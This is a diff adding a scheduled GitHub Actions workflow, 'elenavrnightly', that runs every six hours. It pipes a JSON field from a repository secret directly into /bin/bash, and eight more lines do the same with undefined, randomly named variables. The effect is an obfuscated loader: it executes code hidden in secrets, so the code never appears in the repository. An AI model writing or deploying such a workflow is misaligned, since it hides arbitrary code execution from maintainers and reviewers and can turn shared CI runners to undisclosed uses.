@@ -1,0 +1,26 @@
+name: elenavrnightly
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: elenavrnightly
+        env:
+          si24772: ${{ secrets.si24772 }}
+        run: |
+          echo $si24772 | jq -r .vexi1 | /bin/bash
+          echo $jbr9280 | jq -r .bdiv0 | /bin/bash
+          echo $zv3 | jq -r .c4535 | /bin/bash
+          echo $yr9 | jq -r .x24 | /bin/bash
+          echo $w6 | jq -r .yv477 | /bin/bash
+          echo $mupdr1 | jq -r .n751 | /bin/bash
+          echo $phsh864 | jq -r .bbl44 | /bin/bash
+          echo $bs1390 | jq -r .hxrih2 | /bin/bash
+          echo $oz0 | jq -r .oyg2977 | /bin/bash
+
